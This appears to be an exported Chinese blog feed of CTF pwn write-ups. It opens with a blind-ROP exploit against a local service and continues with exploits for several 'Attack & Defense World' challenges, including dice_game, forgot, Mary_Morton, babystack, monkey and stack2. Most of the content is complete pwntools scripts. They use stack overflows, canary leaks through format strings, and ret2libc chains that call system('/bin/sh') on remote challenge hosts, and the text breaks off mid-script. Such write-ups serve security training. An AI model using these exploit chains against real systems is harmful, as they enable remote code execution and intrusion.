<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stop_addr</span><span class="params">(length)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">            payload = <span class="string">'a'</span> * length + p64(addr)</span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            sh.recv()</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'one success addr: 0x%x'</span> % (addr)  <span class="comment">#若有正常返回，那么存在正确的add，输入即可，若没有，则报错</span></span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure>

<p>3.识别brop gadgets</p>
<p>下面，我们根据上面介绍的原理来得到对应的brop gadgets地址。构造如下，get_brop_gadget是为了得到可能的brop gadget，后面的check_brop_gadget是为了检查。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_brop_gadget</span><span class="params">(length, stop_gadget, addr)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'a'</span> * length + p64(addr) + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(</span><br><span class="line">            stop_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">print</span> content</span><br><span class="line">        <span class="comment"># stop gadget returns memory</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content.startswith(<span class="string">'WelCome'</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_brop_gadget</span><span class="params">(length, addr)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'a'</span> * length + p64(addr) + <span class="string">'a'</span> * <span class="number">8</span> * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line">addr = <span class="number">0x400740</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">print</span> hex(addr)</span><br><span class="line">    <span class="keyword">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'possible brop gadget: 0x%x'</span> % addr</span><br><span class="line">        <span class="keyword">if</span> check_brop_gadget(length, addr):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'success brop gadget: 0x%x'</span> % addr</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    addr += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>在程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为\x7fELF</p>
<p>4.所以我们可以接着去找put函数的地址即put@plt</p>
<p>我们找到的gadget为libc_csu_init中的可以操作6个寄存器的</p>
<p>所以我们可以使用pop_rdi = brop_add + 9来获得</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'A'</span>*<span class="number">72</span> +p64(pop_rdi_ret)+p64(<span class="number">0x400000</span>)+p64(addr)+p64(stop_gadget)</span><br></pre></td></tr></table></figure>

<p>具体函数:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_addr</span><span class="params">(length, rdi_ret, stop_gadget)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> hex(addr)</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'A'</span> * length + p64(rdi_ret) + p64(<span class="number">0x400000</span>) + p64(</span><br><span class="line">            addr) + p64(stop_gadget)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">if</span> content.startswith(<span class="string">'\x7fELF'</span>):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'find puts@plt addr: 0x%x'</span> % addr</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure>

<p>5.寻找put@got</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(length, rdi_ret, puts_plt, leak_addr, stop_gadget)</span>:</span></span><br><span class="line">    sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">    payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(leak_addr) + p64(</span><br><span class="line">        puts_plt) + p64(stop_gadget)</span><br><span class="line">    sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data[:data.index(<span class="string">"\nWelCome"</span>)]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = data</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">""</span>:</span><br><span class="line">            data = <span class="string">'\x00'</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line"><span class="comment">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400560</span></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">    <span class="keyword">print</span> hex(addr)</span><br><span class="line">    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += data</span><br><span class="line">    addr += len(data)  <span class="comment">#这里的len(data)若为\x00则为1，没毛病。若不为\x00为其他字节，因为一个地址对应一个储存单元对应一字节，而且len(data)为字节数，所以输入多少个字节就往后移动多少字节就ok</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'code'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(result)</span><br></pre></td></tr></table></figure>

<p>可以根据输出的数据转化为汇编来看plt表中的got地址</p>
<p>之后在通过put@plt泄露出puts@got中的内容（即libc中的地址）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line"><span class="comment">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400560</span></span><br><span class="line"><span class="comment">##leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(</span><br><span class="line">    stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recvuntil(<span class="string">'\nWelCome'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(binsh_addr) + p64(</span><br><span class="line">    system_addr) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>攻防世界进阶区</title>
    <url>/2020/01/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6%E5%8C%BA/</url>
    <content><![CDATA[<h1 id="攻防世界进阶区"><a href="#攻防世界进阶区" class="headerlink" title="攻防世界进阶区"></a>攻防世界进阶区</h1><a id="more"></a>

<h2 id="1-dice-game"><a href="#1-dice-game" class="headerlink" title="1. dice _ game"></a>1. dice _ game</h2><p>同新手区的那个随机数问题</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./dice_game'</span></span><br><span class="line">libc_name = <span class="string">'./libc.so.6'</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'43605'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"libc.so.6"</span>)</span><br><span class="line">p = remote(ip,port)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Welcome, let me know your name: "</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0x40</span>) + p64(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">"Give me the point(1~6): "</span>,str(libc.rand()%<span class="number">6</span> + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure>

<h2 id="2-forgot"><a href="#2-forgot" class="headerlink" title="2.forgot"></a>2.forgot</h2><p>使用@字符绕过下面的嵌套着swich语句的for循环</p>
<p>使得v14一直为1</p>
<p>从而使后面的调用函数的地址一直是v3的值</p>
<p>我们只需栈溢出覆盖v3的值为危险函数地址就好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'59557'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x80486cc</span></span><br><span class="line">payload = <span class="string">"@"</span> * <span class="number">32</span> + p32(system)</span><br><span class="line">payload1 = <span class="string">"summerN"</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"a"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,payload)</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure>

<h2 id="3-warmup"><a href="#3-warmup" class="headerlink" title="3.warmup"></a>3.warmup</h2><h5 id="先看一下sprintf"><a href="#先看一下sprintf" class="headerlink" title="先看一下sprintf()"></a>先看一下sprintf()</h5><p>sprintf指的是字符串格式化命令，函数声明为 int sprintf(char *string, char *format<br>[,argument,…]);，主要功能是把格式化的数据写入某个字符串中，即发送格式化输出到 string 所指向的字符串。sprintf<br>是个<a href="https://baike.baidu.com/item/变参/9844833" target="_blank" rel="noopener">变参</a>函数。使用sprintf 对于写入buffer的字符数是没有限制的，这就存在了buffer溢出的可能性。解决这个问题，可以考虑使用 <a href="https://baike.baidu.com/item/snprintf" target="_blank" rel="noopener">snprintf</a>函数，该函数可对写入字符数做出限制。</p>
<p>题目直接通过sprintf函数泄露出了危险函数地址</p>
<p>exp:</p>
<h2 id="4-Mary-Morton"><a href="#4-Mary-Morton" class="headerlink" title="4.Mary_Morton"></a>4.Mary_Morton</h2><p>步骤：</p>
<p>1.通过格式化字符串漏洞泄露cannary</p>
<p>2.绕过cannary执行危险函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'57071'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p=process(file_name)</span></span><br><span class="line">p=remote(ip,port)</span><br><span class="line">alarm_add = <span class="number">0x4008DA</span></span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">offset1 = offset + (<span class="number">0x90</span><span class="number">-8</span>)/<span class="number">8</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"3. Exit the battle \n"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">payload = <span class="string">"%23$p"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">cann = int(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> cann</span><br><span class="line">p.recvuntil(<span class="string">"3. Exit the battle \n"</span>)</span><br><span class="line">payload1 = <span class="string">'a'</span>*(<span class="number">0x88</span>) + p64(cann) + p64(<span class="number">1</span>) + p64(<span class="number">0x4008DA</span>)  <span class="comment">#p64里面不能有字符串</span></span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"><span class="comment">#p.recvline()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="5-pwn1"><a href="#5-pwn1" class="headerlink" title="5.pwn1"></a>5.pwn1</h2><p>这个题的思路：</p>
<p>1.通过自带的puts函数泄露cannary</p>
<p>2.构造简单的rop泄露libc版本与基地址</p>
<p>3.拿到shell</p>
<p>注意：</p>
<p>本题中，如果想执行我们覆盖掉的返回地址，必须使程序结束，即s=3</p>
<p>因为我们覆盖的是main函数的返回地址，如果一直进行while循环的话是不可能进行return的</p>
<p>上exp：</p>
<p>别看exp很长，因为我走了很多弯路，其实exp很简单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./babystack'</span></span><br><span class="line">libc_name = <span class="string">'./libc-2.23.so'</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'45399'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = remote(ip,port)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400a93</span></span><br><span class="line">main_addr = <span class="number">0x400908</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(puts_plt)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">payload1 = <span class="string">"a"</span> * (<span class="number">0x90</span><span class="number">-8</span>) + <span class="string">"a"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span> * (<span class="number">0x90</span> <span class="number">-7</span>))</span><br><span class="line"><span class="comment">#print u64(p.recv(7).strip("\n").rjust(8,"\x00"))</span></span><br><span class="line">cannary = hex(u64(p.recv(<span class="number">7</span>).strip(<span class="string">"\n"</span>).rjust(<span class="number">8</span>,<span class="string">"\x00"</span>)))</span><br><span class="line"><span class="comment">#print p.recvline().strip("\n").ljust(8,"\x00") </span></span><br><span class="line"><span class="keyword">print</span> cannary</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">p.recvuntil("&gt;&gt; ")</span></span><br><span class="line"><span class="string">#payload2 = "a" * (0x90-8) + p64(int(cannary,16)) + "b" * 8 + </span></span><br><span class="line"><span class="string">payload2 = p64(puts_got)</span></span><br><span class="line"><span class="string">p.sendline("1")</span></span><br><span class="line"><span class="string">p.send(payload2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.recvuntil("&gt;&gt; ")</span></span><br><span class="line"><span class="string">p.sendline("2")</span></span><br><span class="line"><span class="string">start_add = u64(p.recv().ljust(8,"\x00"))</span></span><br><span class="line"><span class="string">print hex(start_add)</span></span><br><span class="line"><span class="string">base_add = start_add - libc.symbols['__libc_start_main']</span></span><br><span class="line"><span class="string">print hex(libc.symbols['__libc_start_main'])</span></span><br><span class="line"><span class="string">print hex(base_add)</span></span><br><span class="line"><span class="string">sys_add = base_add + libc.symbols['system']</span></span><br><span class="line"><span class="string">bin_add = base_add + libc.search("/bin/sh\x00").next()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x88</span>+p64(int(cannary,<span class="number">16</span>))+<span class="string">'a'</span>*<span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">start_add = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,start_add)</span><br><span class="line">libc_add = start_add - libc.dump(<span class="string">"puts"</span>)</span><br><span class="line"><span class="comment">#print start_add</span></span><br><span class="line"><span class="comment">#base_add = start_add - libc.symbols['puts']</span></span><br><span class="line"><span class="comment">#print hex(libc.symbols['puts'])</span></span><br><span class="line"><span class="comment">#print hex(base_add)</span></span><br><span class="line">sys_add = libc_add + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_add = libc_add + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">payload3 = <span class="string">"a"</span> * (<span class="number">0x90</span><span class="number">-8</span>) + p64(int(cannary,<span class="number">16</span>)) + p64(<span class="number">1</span>) + p64(pop_rdi) + p64(bin_add) + p64(sys_add)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="6-monkey"><a href="#6-monkey" class="headerlink" title="6.monkey"></a>6.monkey</h2><p>64位程序</p>
<p>从来没遇见过引入js库的pwn题</p>
<p>引入了js，估计就是个js语言解释器</p>
<p>注意：</p>
<p>1.这道题目多了几个动态链接库，我先说明一下怎么在python+pwn中使用动态链接库：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = process([process_name], env=&#123;<span class="string">'LD_LIBRARY_PATH'</span>:<span class="string">'./'</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>2.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p.sendlineafter(&#39;js&gt;&#39;,&#39;os.system(\&#39;cat flag\&#39;)&#39;)</span><br></pre></td></tr></table></figure>

<p>这里我们需要在后面加上\进行转移</p>
<p>或者将里面的单引号转变为双引号</p>
<p>我们发现我们输入的js函数会执行，因此上exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">file_name = <span class="string">'./js'</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'42533'</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"><span class="comment">#p = process([file_name], env=&#123;'LD_LIBRARY_PATH':'./'&#125;) #在本地中使用动态库</span></span><br><span class="line">p.sendlineafter(<span class="string">'js&gt;'</span>,<span class="string">'os.system(\'cat flag\')'</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="7-stack2"><a href="#7-stack2" class="headerlink" title="7.stack2"></a>7.stack2</h2><p>32位程序</p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579109262215.png" alt="1579109262215"></p>
<p>我们现在v13处下断点</p>
<p>之后再在return 0 处下断点</p>
<p>这样的话可以让我们找到输入数字的栈地址，更改时的栈地址，以及在跳入return 0 之前以及执行ret汇编指令之前的变化情况从而获取偏移量</p>
<p><img src="https://i.loli.net/2020/01/16/H36M18FjuCIB5aL.png" alt="QQ截图20200116012503.png"></p>
<p><img src="https://i.loli.net/2020/01/16/OdYxFgqyhQHGC3u.png" alt="QQ截图20200116012525.png"></p>
<p><img src="https://i.loli.net/2020/01/16/LAlWa5o6DPdmi7U.png" alt="QQ截图20200116012517.png"></p>
<p><img src="https://i.loli.net/2020/01/16/Uuy5hGgpbd2eozr.png" alt="QQ截图20200116012513.png"></p>
<p>改变了v13[1]</p>
<p><a href="https://blog.csdn.net/xi_niuniu/article/details/44978207" target="_blank" rel="noopener">https://blog.csdn.net/xi_niuniu/article/details/44978207</a></p>
<p>ret 可以理解为pop eip</p>
<p>那么我们在还没有执行ret的时候</p>
<p>eip指向的为返回地址，而此时还没有pop eip</p>
<p>所以现在esp指向的栈地址即为返回地址所在的位置，也就是我们想要的偏移地址最低位字节的地址</p>
<p>通过这个我们可以计算offset = （0x43cc-4348）= 0x84</p>
<p>这是最难的地方</p>
<p>其次，从其他大佬wp可知，本体的靶机并没有bash，所以使用原来的后门没有用</p>
<p>因此我们要构造一个rop</p>
<p>1.call system指令地址</p>
<p>2.sh</p>
<p>写exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'37458'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = remote(ip,port)</span><br><span class="line">offset = <span class="number">0x84</span></span><br><span class="line">sh_add = <span class="number">0x08048987</span></span><br><span class="line">call_sys = <span class="number">0x080485B4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addr</span><span class="params">(offset,size)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"which number to change:"</span>)</span><br><span class="line">	p.sendline(str(offset))</span><br><span class="line">	p.recvuntil(<span class="string">"new number:"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"255"</span>)</span><br><span class="line">addr(offset,<span 